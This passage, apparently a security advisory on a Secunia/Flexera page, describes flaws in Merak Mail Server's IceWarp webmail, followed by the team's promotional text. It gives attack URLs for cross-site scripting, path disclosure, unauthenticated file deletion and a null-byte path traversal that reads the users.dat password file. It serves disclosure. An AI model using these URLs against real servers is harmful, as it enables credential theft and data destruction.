scripting (XSS) attack.

Vulnerable pages:
blank.html
calendar_d.html
calendar_m.html
calendar_w.html

Examples:
<http://localhost:32000/mail/blank.html?id=>[xss_here]
<http://localhost:32000/mail/calendar_d.html?schedule=1&print=1&createdataCX=>[xss_here]
 <http://localhost:32000/mail/calendar_m.html?schedule=1&print=1&createdataCX=>[xss_here]
 <http://localhost:32000/mail/calendar_w.html?schedule=1&print=1&createdataCX=>[xss_here]

2. Full install path disclosure.

Description:
Remote user, who HAS NOT account on Merak Mail Server, can disclosure full install \
path of the product. It could be used during attack on an affected system.

Vulnerable script:
bwlist_inc.html

Examples:
<http://localhost:32000/mail/bwlist_inc.html>
<http://localhost:32000/accounts/bwlist_inc.html>

3. Deletion arbitrary directories and files on remote system.

Description: Remote user, who HAS NOT account on Merak Mail Server, can delete
arbitrary directories and files on local file system of the remote Merak server. It \
could be used for deleting any data on an affected system or causing denial of \

Example:

Deletion arbitrary directory:
<http://localhost:32000/mail/logout.html?id=>[relative path]

Deletion arbitrary file:
<http://localhost:32000/mail/logout.html?id=>[relative path]%00blabla

4. PHP inclusion.

Descripttion: Remote user, who HAS NOT account on Merak Mail Server, can view and \
download arbitrary files  on an affected system or execute arbitrary PHP code with \
webmail privileges. From files user.dat, users.dat attacker could get users and \
administrators passwords and take complete control of a Merak Mail Server. If Merak \
Mail Server was been running under administrator account then attacker could take \
complete control of an affected system.

Example:

<http://localhost:32000/accounts/help.html?helpid=../../../webmail/config/users.dat%00>

EXPLOITATION

IceWarp Web Mail (CONTROL service) must be running on Merak Mail Server (default \

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
